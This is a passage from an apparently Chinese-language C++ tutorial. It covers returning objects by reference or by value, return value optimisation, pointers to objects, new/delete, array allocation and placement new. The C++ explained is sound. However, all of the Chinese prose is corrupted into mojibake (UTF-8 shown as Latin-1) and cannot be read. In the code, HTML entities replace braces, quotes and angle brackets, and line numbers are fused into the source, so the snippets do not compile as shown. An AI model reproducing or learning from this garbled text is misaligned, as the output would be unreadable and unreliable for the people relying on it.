å‘æŒ¥ä½œç”¨çš„åœ°æ–¹ï¼šå¦‚æœä½ çš„ç±»åªä½¿ç”¨é‚£äº›è‡ªèº«èƒ½æ­£ç¡®ç®¡ç†èµ„æºçš„æˆå‘˜ï¼ˆå¦‚ std::string, std::vector, std::unique_ptr ç­‰ï¼‰ï¼Œå¹¶ä¸”ä¸ç›´æ¥è¿›è¡Œæ‰‹åŠ¨çš„ new/deleteï¼Œé‚£ä¹ˆä½ é€šå¸¸ä¸éœ€è¦æä¾›ä»»ä½•è‡ªå®šä¹‰çš„ææ„å‡½æ•°ã€å¤åˆ¶/ç§»åŠ¨æ„é€ å‡½æ•°æˆ–èµ‹å€¼è¿ç®—ç¬¦ï¼Œç¼–è¯‘å™¨ç”Ÿæˆçš„é»˜è®¤ç‰ˆæœ¬å°±èƒ½å¾ˆå¥½åœ°å·¥ä½œã€‚ 12.4 æœ‰å…³è¿”å›å¯¹è±¡çš„è¯´æ˜å½“å‡½æ•°æˆ–æ–¹æ³•éœ€è¦è¿”å›ä¸€ä¸ªç±»å¯¹è±¡æ—¶ï¼Œæœ‰å‡ ç§ä¸åŒçš„æ–¹å¼å¯ä»¥å®ç°ï¼Œæ¯ç§æ–¹å¼éƒ½æœ‰å…¶é€‚ç”¨çš„åœºæ™¯å’Œæ½œåœ¨çš„æ•ˆç‡æˆ–å®‰å…¨ implicationsã€‚ä¸»è¦çš„æ–¹å¼åŒ…æ‹¬ï¼šè¿”å›æŒ‡å‘å¯¹è±¡çš„å¼•ç”¨ï¼ˆconst æˆ–é constï¼‰å’Œè¿”å›å¯¹è±¡æœ¬èº«ï¼ˆæŒ‰å€¼è¿”å›ï¼Œconst æˆ–é constï¼‰ã€‚ 12.4.1 è¿”å›æŒ‡å‘ const å¯¹è±¡çš„å¼•ç”¨è¯­æ³•: const ClassName &amp; functionName(parameters); ä½•æ—¶ä½¿ç”¨:å½“å‡½æ•°éœ€è¦è¿”å›ä¸€ä¸ªå·²ç»å­˜åœ¨çš„å¯¹è±¡ï¼ˆä¾‹å¦‚ï¼Œç±»çš„æˆå‘˜ã€é€šè¿‡å¼•ç”¨ä¼ é€’ç»™å‡½æ•°çš„å¯¹è±¡ï¼‰ï¼Œå¹¶ä¸”ä¸å¸Œæœ›è°ƒç”¨è€…é€šè¿‡è¿”å›çš„å¼•ç”¨ä¿®æ”¹è¿™ä¸ªå¯¹è±¡æ—¶ã€‚ ä¼˜ç‚¹: é«˜æ•ˆ: é¿å…äº†åˆ›å»ºå¯¹è±¡çš„å‰¯æœ¬ã€‚è¿”å›çš„åªæ˜¯å¯¹è±¡çš„åœ°å€ï¼ˆå¼•ç”¨ï¼‰ã€‚ å®‰å…¨: const ä¿è¯äº†è°ƒç”¨è€…ä¸èƒ½æ„å¤–åœ°ä¿®æ”¹è¿”å›çš„å¯¹è±¡ã€‚ ç¼ºç‚¹/æ³¨æ„äº‹é¡¹: ä¸èƒ½è¿”å›å±€éƒ¨å¯¹è±¡çš„å¼•ç”¨: å‡½æ•°ä¸èƒ½è¿”å›åœ¨å‡½æ•°å†…éƒ¨åˆ›å»ºçš„å±€éƒ¨å˜é‡çš„å¼•ç”¨ã€‚å½“å‡½æ•°ç»“æŸæ—¶ï¼Œå±€éƒ¨å˜é‡ä¼šè¢«é”€æ¯ï¼Œè¿”å›çš„å¼•ç”¨å°†æˆä¸º**æ‚¬æŒ‚å¼•ç”¨ (dangling reference)**ï¼Œè®¿é—®å®ƒä¼šå¯¼è‡´æœªå®šä¹‰è¡Œä¸ºã€‚ è¿”å›çš„å¯¹è±¡å¿…é¡»åœ¨å‡½æ•°è°ƒç”¨ç»“æŸåä»ç„¶å­˜åœ¨ã€‚ ç¤ºä¾‹:å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ª Store ç±»ï¼ŒåŒ…å«å¤šä¸ª Product å¯¹è±¡ï¼Œæˆ‘ä»¬æƒ³æä¾›ä¸€ä¸ªæ–¹æ³•æ¥é€šè¿‡ ID è·å–æŸä¸ªäº§å“çš„ä¿¡æ¯ï¼Œä½†ä¸å…è®¸ä¿®æ”¹å®ƒã€‚ 12345678910111213141516171819202122232425262728293031323334353637class Product &#123;private: std::string name; double price;public: Product(const std::string&amp; n = &quot;N/A&quot;, double p = 0.0) : name(n), price(p) &#123;&#125; void show() const &#123; std::cout &lt;&lt; name &lt;&lt; &quot;: $&quot; &lt;&lt; price; &#125; // ... å…¶ä»–æ–¹æ³• ...&#125;;class Store &#123;private: std::vector&lt;Product&gt; products; Product defaultProduct; // ç”¨äºæ‰¾ä¸åˆ°æ—¶è¿”å›public: // ... æ–¹æ³•æ·»åŠ äº§å“ ... // é€šè¿‡ ID æŸ¥æ‰¾äº§å“ï¼Œè¿”å› const å¼•ç”¨ const Product &amp; findProductById(int id) const &#123; if (id &gt;= 0 &amp;&amp; id &lt; products.size()) &#123; return products[id]; // è¿”å› vector ä¸­å·²å­˜åœ¨å¯¹è±¡çš„ const å¼•ç”¨ &#125; else &#123; return defaultProduct; // è¿”å›ä¸€ä¸ªå·²å­˜åœ¨çš„é»˜è®¤å¯¹è±¡çš„ const å¼•ç”¨ &#125; // é”™è¯¯ç¤ºä¾‹ï¼š // Product temp(&quot;Temporary&quot;, 0.0); // return temp; // é”™è¯¯ï¼ä¸èƒ½è¿”å›å±€éƒ¨å˜é‡çš„å¼•ç”¨ &#125;&#125;;int main() &#123; Store myStore; // ... æ·»åŠ äº§å“åˆ° myStore ... const Product &amp; found = myStore.findProductById(1); // é«˜æ•ˆï¼Œæ— å¤åˆ¶ found.show(); // OK: è°ƒç”¨ const æ–¹æ³• // found.setPrice(9.99); // é”™è¯¯ï¼ä¸èƒ½é€šè¿‡ const å¼•ç”¨è°ƒç”¨é const æ–¹æ³• return 0;&#125; 12.4.2 è¿”å›æŒ‡å‘é const å¯¹è±¡çš„å¼•ç”¨è¯­æ³•: ClassName &amp; functionName(parameters); ä½•æ—¶ä½¿ç”¨:å½“å‡½æ•°éœ€è¦è¿”å›ä¸€ä¸ªå·²ç»å­˜åœ¨çš„å¯¹è±¡ï¼Œå¹¶ä¸”å…è®¸è°ƒç”¨è€…é€šè¿‡è¿”å›çš„å¼•ç”¨ä¿®æ”¹è¿™ä¸ªå¯¹è±¡æ—¶ã€‚æœ€å¸¸è§çš„ä¾‹å­æ˜¯é‡è½½æŸäº›è¿ç®—ç¬¦ï¼Œå¦‚ [] (ä¸‹æ ‡) æˆ– += (å¤åˆèµ‹å€¼)ã€‚ ä¼˜ç‚¹: é«˜æ•ˆ: åŒæ ·é¿å…äº†åˆ›å»ºå¯¹è±¡çš„å‰¯æœ¬ã€‚ å…è®¸ä¿®æ”¹: å¯ä»¥ç”¨äºå®ç°é“¾å¼è°ƒç”¨æˆ–å…è®¸ç›´æ¥ä¿®æ”¹è¿”å›çš„å¯¹è±¡ã€‚ ç¼ºç‚¹/æ³¨æ„äº‹é¡¹: ä¸èƒ½è¿”å›å±€éƒ¨å¯¹è±¡çš„å¼•ç”¨: ä¸è¿”å› const å¼•ç”¨ä¸€æ ·ï¼Œç»å¯¹ä¸èƒ½è¿”å›å‡½æ•°å†…éƒ¨å±€éƒ¨å˜é‡çš„å¼•ç”¨ã€‚ ç ´åå°è£… (å¯èƒ½): å¦‚æœè¿”å›çš„æ˜¯ç±»å†…éƒ¨ç§æœ‰æˆå‘˜çš„é const å¼•ç”¨ï¼Œå¯èƒ½ä¼šç ´åç±»çš„å°è£…æ€§ï¼Œå…è®¸å¤–éƒ¨ä»£ç ç›´æ¥ä¿®æ”¹å†…éƒ¨çŠ¶æ€ï¼Œåº”è°¨æ…ä½¿ç”¨ã€‚ ç¤ºä¾‹:é‡è½½ String ç±»çš„ä¸‹æ ‡è¿ç®—ç¬¦ []ï¼Œå…è®¸ä¿®æ”¹å­—ç¬¦ã€‚ 123456789101112131415161718192021222324252627// åœ¨ String ç±»ä¸­ (æ¥è‡ª string1.h)class String &#123; // ...public: // ... // è¿”å›é const å¼•ç”¨ï¼Œå…è®¸ä¿®æ”¹ char &amp; operator[](int i); // è¿”å› const å¼•ç”¨ï¼Œç”¨äº const å¯¹è±¡ const char &amp; operator[](int i) const;&#125;;// å®ç°char &amp; String::operator[](int i) &#123; return str[i]; // è¿”å›å†…éƒ¨ char æ•°ç»„å…ƒç´ çš„å¼•ç”¨&#125;const char &amp; String::operator[](int i) const &#123; return str[i];&#125;// ä½¿ç”¨String greeting(&quot;Hello&quot;);greeting[0] = &#x27;J&#x27;; // OK: é€šè¿‡è¿”å›çš„å¼•ç”¨ä¿®æ”¹äº†ç¬¬ä¸€ä¸ªå­—ç¬¦cout &lt;&lt; greeting &lt;&lt; endl; // è¾“å‡º Jelloconst String constGreeting(&quot;Hi&quot;);char firstChar = constGreeting[0]; // OK: è¯»å–å­—ç¬¦// constGreeting[0] = &#x27;B&#x27;; // é”™è¯¯ï¼ä¸èƒ½ä¿®æ”¹ const å¯¹è±¡ å¦ä¸€ä¸ªä¾‹å­æ˜¯ operator+=ï¼Œå®ƒä¿®æ”¹å¯¹è±¡è‡ªèº«å¹¶è¿”å›è‡ªèº«çš„å¼•ç”¨ä»¥æ”¯æŒé“¾å¼æ“ä½œï¼ˆè™½ç„¶é“¾å¼èµ‹å€¼ä¸å¸¸è§ï¼‰ã€‚ 12345// åœ¨ Time ç±»ä¸­Time&amp; Time::operator+=(const Time&amp; t) &#123; // ... å®ç°åŠ æ³•é€»è¾‘ï¼Œä¿®æ”¹ *this ... return *this; // è¿”å›è°ƒç”¨å¯¹è±¡è‡ªèº«çš„å¼•ç”¨&#125; 12.4.3 è¿”å›å¯¹è±¡ (æŒ‰å€¼è¿”å›)è¯­æ³•: ClassName functionName(parameters); ä½•æ—¶ä½¿ç”¨:å½“å‡½æ•°éœ€è¦è¿”å›ä¸€ä¸ªæ–°åˆ›å»ºçš„å¯¹è±¡ï¼ˆåœ¨å‡½æ•°å†…éƒ¨è®¡ç®—æˆ–æ„é€ å¾—åˆ°ï¼‰ï¼Œæˆ–è€…éœ€è¦è¿”å›ä¸€ä¸ªç°æœ‰å¯¹è±¡çš„å‰¯æœ¬è€Œä¸æ˜¯å…¶æœ¬èº«æ—¶ã€‚è¿™æ˜¯æœ€å¸¸è§å’Œæœ€å®‰å…¨çš„è¿”å›å¯¹è±¡çš„æ–¹å¼ï¼Œç‰¹åˆ«æ˜¯å¯¹äºå±€éƒ¨å¯¹è±¡ã€‚ ä¼˜ç‚¹: å®‰å…¨: ä¸ä¼šè¿”å›æ‚¬æŒ‚å¼•ç”¨ã€‚è¿”å›çš„æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„å‰¯æœ¬ï¼ˆæˆ–ç§»åŠ¨åçš„å¯¹è±¡ï¼‰ã€‚ ç®€å•: æ˜“äºç†è§£å’Œå®ç°ã€‚ ç¼ºç‚¹/æ³¨æ„äº‹é¡¹: å¯èƒ½æœ‰æ•ˆç‡å¼€é”€: ä¼ ç»Ÿä¸Šï¼ŒæŒ‰å€¼è¿”å›ä¼šè°ƒç”¨å¤åˆ¶æ„é€ å‡½æ•°æ¥åˆ›å»ºè¿”å›å€¼çš„å‰¯æœ¬ï¼Œè¿™å¯èƒ½æ¶‰åŠå¤§é‡æ•°æ®çš„å¤åˆ¶å’Œå†…å­˜åˆ†é…/é‡Šæ”¾ï¼Œæ•ˆç‡è¾ƒä½ã€‚ è¿”å›å€¼ä¼˜åŒ– (RVO/NRVO): ç°ä»£ C++ ç¼–è¯‘å™¨é€šå¸¸ä¼šåº”ç”¨è¿”å›å€¼ä¼˜åŒ– (Return Value Optimization, RVO) æˆ–å‘½åè¿”å›å€¼ä¼˜åŒ– (Named Return Value Optimization, NRVO)**ã€‚è¿™äº›ä¼˜åŒ–å¯ä»¥å®Œå…¨é¿å…**å¤åˆ¶æ„é€ å‡½æ•°çš„è°ƒç”¨ï¼Œç›´æ¥åœ¨è°ƒç”¨è€…æŒ‡å®šçš„å†…å­˜ä½ç½®ä¸Šæ„é€ è¿”å›çš„å¯¹è±¡ï¼Œä»è€Œå¤§å¤§æé«˜æŒ‰å€¼è¿”å›çš„æ•ˆç‡ã€‚ ç§»åŠ¨è¯­ä¹‰ (C++11): å¦‚æœ RVO/NRVO ä¸é€‚ç”¨ï¼Œä½†ç±»æœ‰ç§»åŠ¨æ„é€ å‡½æ•°ï¼Œç¼–è¯‘å™¨å¯èƒ½ä¼šé€‰æ‹©è°ƒç”¨ç§»åŠ¨æ„é€ å‡½æ•°è€Œä¸æ˜¯å¤åˆ¶æ„é€ å‡½æ•°æ¥è½¬ç§»èµ„æºæ‰€æœ‰æƒï¼Œè¿™ä¹Ÿæ¯”æ·±å¤åˆ¶é«˜æ•ˆå¾—å¤šã€‚ ç¤ºä¾‹:é‡è½½ Vector ç±»çš„ + è¿ç®—ç¬¦ã€‚ 1234567891011121314151617181920212223// åœ¨ Vector ç±»ä¸­class Vector &#123; // ...public: // ... // æŒ‰å€¼è¿”å›ä¸€ä¸ªæ–°çš„ Vector å¯¹è±¡ Vector operator+(const Vector &amp; b) const;&#125;;// å®ç°Vector Vector::operator+(const Vector &amp; b) const &#123; // æ–¹æ³• 1: åˆ›å»ºå‘½åå¯¹è±¡å¹¶è¿”å› (å¯èƒ½è§¦å‘ NRVO) Vector sum(x + b.x, y + b.y); return sum; // æ–¹æ³• 2: ç›´æ¥è¿”å›ä¸´æ—¶å¯¹è±¡ (å¯èƒ½è§¦å‘ RVO) // return Vector(x + b.x, y + b.y);&#125;// ä½¿ç”¨Vector v1(1, 2), v2(3, 4);Vector v3 = v1 + v2; // v1 + v2 è¿”å›ä¸€ä¸ªä¸´æ—¶ Vector å¯¹è±¡ // è¿™ä¸ªä¸´æ—¶å¯¹è±¡è¢«ç”¨æ¥åˆå§‹åŒ– v3 (å¯èƒ½é€šè¿‡ RVO/NRVO æˆ–ç§»åŠ¨/å¤åˆ¶æ„é€ ) ç”±äº RVO/NRVO å’Œç§»åŠ¨è¯­ä¹‰çš„å­˜åœ¨ï¼ŒæŒ‰å€¼è¿”å›åœ¨ç°ä»£ C++ ä¸­é€šå¸¸æ˜¯é«˜æ•ˆä¸”æ¨èçš„æ–¹å¼ï¼Œç‰¹åˆ«æ˜¯å¯¹äºé‚£äº›è¡¨ç¤ºâ€œå€¼â€è€Œéâ€œèº«ä»½â€çš„ç±»å‹ã€‚ 12.4.4 è¿”å› const å¯¹è±¡ (æŒ‰å€¼è¿”å›)è¯­æ³•: const ClassName functionName(parameters); ä½•æ—¶ä½¿ç”¨:è¿™æ˜¯ä¸€ç§ä¸å¤ªå¸¸è§çš„è¿”å›æ–¹å¼ã€‚å®ƒæŒ‰å€¼è¿”å›ä¸€ä¸ªå¯¹è±¡ï¼Œä½†è¿™ä¸ªè¿”å›çš„ä¸´æ—¶å¯¹è±¡æ˜¯ const çš„ã€‚ ä¼˜ç‚¹: é˜»æ­¢å¯¹è¿”å›çš„ä¸´æ—¶å¯¹è±¡è°ƒç”¨é const æ–¹æ³•: å¦‚æœä¸€ä¸ªå‡½æ•°æŒ‰å€¼è¿”å›ä¸€ä¸ªå¯¹è±¡ï¼Œè°ƒç”¨è€…å¯ä»¥ç«‹å³å¯¹è¿™ä¸ªè¿”å›çš„ä¸´æ—¶å¯¹è±¡è°ƒç”¨å…¶æˆå‘˜å‡½æ•°ã€‚å¦‚æœè¿”å›ç±»å‹æ˜¯ const ClassNameï¼Œåˆ™åªèƒ½è°ƒç”¨è¯¥å¯¹è±¡çš„ const æˆå‘˜å‡½æ•°ã€‚ ç¼ºç‚¹/æ³¨æ„äº‹é¡¹: é€šå¸¸æ„ä¹‰ä¸å¤§: å¯¹äºç±»ç±»å‹ï¼Œå°†æŒ‰å€¼è¿”å›çš„å¯¹è±¡å£°æ˜ä¸º const é€šå¸¸æ²¡ä»€ä¹ˆå¿…è¦ã€‚å› ä¸ºè¿”å›çš„æ˜¯ä¸€ä¸ªä¸´æ—¶å¯¹è±¡ï¼ˆå³å€¼ï¼‰ï¼Œå¯¹å…¶è¿›è¡Œä¿®æ”¹é€šå¸¸æ²¡æœ‰æ„ä¹‰ï¼Œè€Œä¸” C++11 çš„ç§»åŠ¨è¯­ä¹‰é€šå¸¸æ›´å…³å¿ƒå¯¹è±¡æ˜¯å¦æ˜¯å³å€¼ï¼Œè€Œä¸æ˜¯å®ƒæ˜¯å¦ constã€‚åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œè¿”å› const å¯¹è±¡ç”šè‡³å¯èƒ½é˜»æ­¢ç§»åŠ¨è¯­ä¹‰çš„åº”ç”¨ï¼Œå¯¼è‡´ä¸å¿…è¦çš„å¤åˆ¶ã€‚ å¯¹äºå†…ç½®ç±»å‹ï¼ˆå¦‚ intï¼‰ï¼Œè¿”å› const int å‡ ä¹æ²¡æœ‰ä»»ä½•ä½œç”¨ã€‚ ç¤ºä¾‹: 123456789101112const String getName() &#123; String temp = &quot;Temporary Name&quot;; return temp; // è¿”å› const String å¯¹è±¡&#125;int main() &#123; // getName()[0] = &#x27;X&#x27;; // é”™è¯¯ï¼ä¸èƒ½å¯¹è¿”å›çš„ const ä¸´æ—¶å¯¹è±¡è°ƒç”¨é const çš„ operator[] char first = getName()[0]; // OK: è°ƒç”¨ const çš„ operator[] String nameCopy = getName(); // OK: const ä¸´æ—¶å¯¹è±¡å¯ä»¥ç”¨æ¥åˆå§‹åŒ–é const å¯¹è±¡ (é€šè¿‡å¤åˆ¶/ç§»åŠ¨æ„é€ ) return 0;&#125; æ€»çš„æ¥è¯´ï¼Œé™¤éæœ‰éå¸¸ç‰¹æ®Šçš„åŸå› éœ€è¦é˜»æ­¢å¯¹è¿”å›çš„ä¸´æ—¶å¯¹è±¡è°ƒç”¨é const æ–¹æ³•ï¼Œå¦åˆ™é€šå¸¸ä¸æ¨èæŒ‰å€¼è¿”å› const å¯¹è±¡ã€‚ç›´æ¥æŒ‰å€¼è¿”å›é const å¯¹è±¡é€šå¸¸æ›´çµæ´»ï¼Œå¹¶ä¸”æ›´èƒ½å—ç›Šäº RVO å’Œç§»åŠ¨è¯­ä¹‰ã€‚ æ€»ç»“: è¿”å›å¼•ç”¨ (&amp; æˆ– const &amp;): é«˜æ•ˆï¼Œæ— å¤åˆ¶ã€‚ç”¨äºè¿”å›å·²å­˜åœ¨çš„ã€ç”Ÿå‘½å‘¨æœŸè¶³å¤Ÿé•¿çš„å¯¹è±¡ã€‚ç»ä¸èƒ½è¿”å›å±€éƒ¨å˜é‡çš„å¼•ç”¨ã€‚const &amp; æ›´å®‰å…¨ï¼Œ&amp; å…è®¸ä¿®æ”¹ã€‚ æŒ‰å€¼è¿”å› (ClassName): å®‰å…¨ï¼Œè¿”å›å‰¯æœ¬æˆ–ç§»åŠ¨åçš„å¯¹è±¡ã€‚é€‚ç”¨äºè¿”å›å‡½æ•°å†…åˆ›å»ºçš„æ–°å¯¹è±¡ã€‚æ•ˆç‡é€šå¸¸ç”± RVO/NRVO å’Œç§»åŠ¨è¯­ä¹‰ä¿è¯ã€‚ æŒ‰å€¼è¿”å› const å¯¹è±¡ (const ClassName): ä¸å¸¸ç”¨ï¼Œå¯èƒ½é˜»æ­¢å¯¹ä¸´æ—¶å¯¹è±¡çš„ä¿®æ”¹ï¼Œä½†é€šå¸¸æ„ä¹‰ä¸å¤§ï¼Œç”šè‡³å¯èƒ½å½±å“ä¼˜åŒ–ã€‚ 12.5 ä½¿ç”¨æŒ‡å‘å¯¹è±¡çš„æŒ‡é’ˆå°±åƒå¯ä»¥ä½¿ç”¨æŒ‡å‘å†…ç½®ç±»å‹ï¼ˆå¦‚ int*ï¼‰æˆ–ç»“æ„ï¼ˆå¦‚ MyStruct*ï¼‰çš„æŒ‡é’ˆä¸€æ ·ï¼Œä¹Ÿå¯ä»¥å£°æ˜å’Œä½¿ç”¨æŒ‡å‘ç±»å¯¹è±¡çš„æŒ‡é’ˆã€‚æŒ‡é’ˆæœ¬èº«å­˜å‚¨çš„æ˜¯å¯¹è±¡çš„å†…å­˜åœ°å€ã€‚ å£°æ˜æŒ‡å‘å¯¹è±¡çš„æŒ‡é’ˆ: 1ClassName * pointerName; ä¾‹å¦‚ï¼Œè¦å£°æ˜ä¸€ä¸ªæŒ‡å‘ String å¯¹è±¡çš„æŒ‡é’ˆï¼š 123#include &quot;string1.h&quot; // åŒ…å« String ç±»å®šä¹‰String * p_string; // å£°æ˜ä¸€ä¸ªæŒ‡å‘ String å¯¹è±¡çš„æŒ‡é’ˆ 12.5.1 å†è¯» new å’Œ deleteä½¿ç”¨ new è¿ç®—ç¬¦å¯ä»¥åœ¨è‡ªç”±å­˜å‚¨åŒºï¼ˆå †ï¼‰ä¸ŠåŠ¨æ€åœ°åˆ›å»ºå¯¹è±¡ï¼Œå¹¶è¿”å›è¯¥å¯¹è±¡çš„åœ°å€ã€‚è¿™ä¸ªåœ°å€å¯ä»¥å­˜å‚¨åœ¨ç›¸åº”ç±»å‹çš„æŒ‡é’ˆä¸­ã€‚ ä½¿ç”¨ new åˆ›å»ºå¯¹è±¡: 12pointerName = new ClassName; // è°ƒç”¨é»˜è®¤æ„é€ å‡½æ•°pointerName = new ClassName(arguments); // è°ƒç”¨åŒ¹é…å‚æ•°çš„æ„é€ å‡½æ•° å½“ä½¿ç”¨ new ClassName(...) æ—¶ï¼Œä¼šå‘ç”Ÿä¸¤ä»¶äº‹ï¼š åœ¨è‡ªç”±å­˜å‚¨åŒºåˆ†é…è¶³å¤Ÿå®¹çº³ ClassName å¯¹è±¡çš„å†…å­˜ã€‚ è°ƒç”¨ç›¸åº”çš„æ„é€ å‡½æ•°æ¥åˆå§‹åŒ–è¿™å—å†…å­˜ä¸­çš„å¯¹è±¡ã€‚ ç¤ºä¾‹: 123456789101112131415#include &quot;string1.h&quot;#include &lt;iostream&gt;int main() &#123; using std::cout; using std::endl; String * p1 = new String(&quot;Dynamically allocated string&quot;); // è°ƒç”¨ String(const char*) String * p2 = new String; // è°ƒç”¨é»˜è®¤æ„é€ å‡½æ•° String() cout &lt;&lt; &quot;p1 points to: &quot; &lt;&lt; *p1 &lt;&lt; endl; // ä½¿ç”¨ * è§£å¼•ç”¨æŒ‡é’ˆè®¿é—®å¯¹è±¡ cout &lt;&lt; &quot;p2 points to: &quot; &lt;&lt; *p2 &lt;&lt; endl; // ... ä½¿ç”¨ p1 å’Œ p2 æŒ‡å‘çš„å¯¹è±¡ ...&#125; ä½¿ç”¨ delete é”€æ¯å¯¹è±¡: é€šè¿‡ new åˆ›å»ºçš„å¯¹è±¡å¿…é¡»ä½¿ç”¨ delete æ¥é”€æ¯ï¼Œä»¥é‡Šæ”¾å†…å­˜å¹¶æ‰§è¡Œæ¸…ç†å·¥ä½œã€‚ 1delete pointerName; å½“ä½¿ç”¨ delete pointerName æ—¶ï¼Œä¼šå‘ç”Ÿä¸¤ä»¶äº‹ï¼š è°ƒç”¨ pointerName æŒ‡å‘çš„å¯¹è±¡çš„ææ„å‡½æ•° (~ClassName())ã€‚ é‡Šæ”¾è¯¥å¯¹è±¡å ç”¨çš„å†…å­˜ã€‚ ç¤ºä¾‹ (ç»­): 1234567891011121314// main.cpp (ç»­)int main() &#123; // ... (åˆ›å»º p1, p2 çš„ä»£ç ) ... cout &lt;&lt; &quot;\\nDeleting objects...\\n&quot;; delete p1; // è°ƒç”¨ ~String() for *p1ï¼Œç„¶åé‡Šæ”¾å†…å­˜ delete p2; // è°ƒç”¨ ~String() for *p2ï¼Œç„¶åé‡Šæ”¾å†…å­˜ // p1 å’Œ p2 ç°åœ¨æ˜¯æ‚¬æŒ‚æŒ‡é’ˆï¼Œä¸åº”å†ä½¿ç”¨ p1 = nullptr; p2 = nullptr; return 0;&#125; å¿˜è®° delete é€šè¿‡ new åˆ›å»ºçš„å¯¹è±¡ä¼šå¯¼è‡´å†…å­˜æ³„æ¼ã€‚ new[] å’Œ delete[] ç”¨äºå¯¹è±¡æ•°ç»„: åŒæ ·å¯ä»¥åŠ¨æ€åˆ†é…å¯¹è±¡æ•°ç»„ã€‚ 123456int size = 5;String * favorites = new String[size]; // è°ƒç”¨ size æ¬¡é»˜è®¤æ„é€ å‡½æ•°// ... ä½¿ç”¨æ•°ç»„ ...delete [] favorites; // è°ƒç”¨ size æ¬¡ææ„å‡½æ•°ï¼Œç„¶åé‡Šæ”¾æ•´ä¸ªæ•°ç»„å†…å­˜ new ClassName[size] ä¼šä¸ºæ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ è°ƒç”¨é»˜è®¤æ„é€ å‡½æ•°ã€‚å¦‚æœç±»æ²¡æœ‰é»˜è®¤æ„é€ å‡½æ•°ï¼Œè¿™ç§åˆ†é…æ–¹å¼å°†å¤±è´¥ã€‚ å¿…é¡»ä½¿ç”¨ delete [] æ¥é‡Šæ”¾é€šè¿‡ new[] åˆ†é…çš„æ•°ç»„ã€‚ä½¿ç”¨ delete (ä¸å¸¦ []) ä¼šå¯¼è‡´æœªå®šä¹‰è¡Œä¸ºï¼ˆé€šå¸¸åªè°ƒç”¨ç¬¬ä¸€ä¸ªå…ƒç´ çš„ææ„å‡½æ•°ï¼Œå¹¶å¯èƒ½å¯¼è‡´å†…å­˜æŸåï¼‰ã€‚ 12.5.2 æŒ‡é’ˆå’Œå¯¹è±¡å°ç»“ å£°æ˜: ClassName * ptr; åŠ¨æ€åˆ›å»º: ptr = new ClassName(args); (è°ƒç”¨æ„é€ å‡½æ•°) åŠ¨æ€é”€æ¯: delete ptr; (è°ƒç”¨ææ„å‡½æ•°) è®¿é—®æˆå‘˜: è§£å¼•ç”¨å’Œç‚¹å·: (*ptr).memberName æˆ– (*ptr).methodName(args) ç®­å¤´è¿ç®—ç¬¦ (å¸¸ç”¨): ptr-&gt;memberName æˆ– ptr-&gt;methodName(args)ã€‚ç®­å¤´è¿ç®—ç¬¦ -&gt; æ˜¯ä¸“é—¨ä¸ºæŒ‡å‘å¯¹è±¡çš„æŒ‡é’ˆè®¿é—®å…¶æˆå‘˜è€Œè®¾è®¡çš„ï¼Œå®ƒç­‰ä»·äºå…ˆè§£å¼•ç”¨å†ç”¨ç‚¹å·è®¿é—®ã€‚ ç¤ºä¾‹ (ä½¿ç”¨ç®­å¤´è¿ç®—ç¬¦): 123456789101112131415#include &quot;string1.h&quot;#include &lt;iostream&gt;int main() &#123; String * glamour = new String(&quot;Glamorous&quot;); // ä½¿ç”¨ç®­å¤´è¿ç®—ç¬¦è®¿é—®æˆå‘˜ std::cout &lt;&lt; &quot;String: &quot; &lt;&lt; glamour-&gt;operator const char *() &lt;&lt; std::endl; // å‡è®¾æœ‰è½¬æ¢å‡½æ•° std::cout &lt;&lt; &quot;Length: &quot; &lt;&lt; glamour-&gt;length() &lt;&lt; std::endl; // è°ƒç”¨ length() æ–¹æ³• std::cout &lt;&lt; &quot;First char: &quot; &lt;&lt; (*glamour)[0] &lt;&lt; std::endl; // æ··åˆä½¿ç”¨ * å’Œ [] std::cout &lt;&lt; &quot;First char again: &quot; &lt;&lt; glamour-&gt;operator[](0) &lt;&lt; std::endl; // ä½¿ç”¨ -&gt; è°ƒç”¨ operator[] delete glamour; return 0;&#125; 12.5.3 å†è¯»å®šä½ new è¿ç®—ç¬¦æ ‡å‡† new åœ¨è‡ªç”±å­˜å‚¨åŒºï¼ˆå †ï¼‰ä¸ŠæŸ¥æ‰¾å†…å­˜å—ã€‚C++ è¿˜å…è®¸é€šè¿‡å¦ä¸€ç§å½¢å¼çš„ newâ€”â€”**å®šä½ new (placement new)**â€”â€”æ¥æŒ‡å®šåˆ†é…å¯¹è±¡çš„ä½ç½®ã€‚ å‰æ: ä½ éœ€è¦æä¾›ä¸€ä¸ªæŒ‡å‘å·²åˆ†é…å¥½çš„å†…å­˜å—çš„åœ°å€ï¼Œå¹¶ç¡®ä¿è¯¥å†…å­˜å—è¶³å¤Ÿå¤§ä»¥å®¹çº³è¦åˆ›å»ºçš„å¯¹è±¡ã€‚ è¯­æ³•: 123456#include &lt;new&gt; // å¿…é¡»åŒ…å« &lt;new&gt; å¤´æ–‡ä»¶BufferType * buffer = /* ... è·å–æŒ‡å‘å·²åˆ†é…å†…å­˜çš„æŒ‡é’ˆ ... */;ClassName * ptr;ptr = new (buffer) ClassName(arguments); // åœ¨ buffer æŒ‡å‘çš„å†…å­˜ä¸Šæ„é€ å¯¹è±¡ new (buffer): è¿™éƒ¨åˆ†æ˜¯å®šä½ new è¿ç®—ç¬¦ã€‚å®ƒä¸åˆ†é…æ–°å†…å­˜ï¼Œè€Œæ˜¯å‘Šè¯‰ç¼–è¯‘å™¨åœ¨ buffer æŒ‡å‘çš„åœ°å€å¤„æ„é€ å¯¹è±¡ã€‚ ClassName(arguments): è°ƒç”¨ç›¸åº”çš„æ„é€ å‡½æ•°æ¥åˆå§‹åŒ– buffer æŒ‡å‘çš„å†…å­˜åŒºåŸŸã€‚ ä½•æ—¶ä½¿ç”¨å®šä½ new? å†…å­˜æ± ç®¡ç†: å½“ä½ éœ€è¦è‡ªå·±ç®¡ç†ä¸€å—å¤§çš„å†…å­˜åŒºåŸŸï¼ˆå†…å­˜æ± ï¼‰ï¼Œå¹¶åœ¨å…¶ä¸­åå¤åˆ›å»ºå’Œé”€æ¯å¯¹è±¡æ—¶ï¼Œå¯ä»¥é¿å…é¢‘ç¹è°ƒç”¨æ ‡å‡† new å’Œ delete å¸¦æ¥çš„å¼€é”€å’Œå†…å­˜ç¢ç‰‡ã€‚ ç‰¹å®šç¡¬ä»¶åœ°å€: 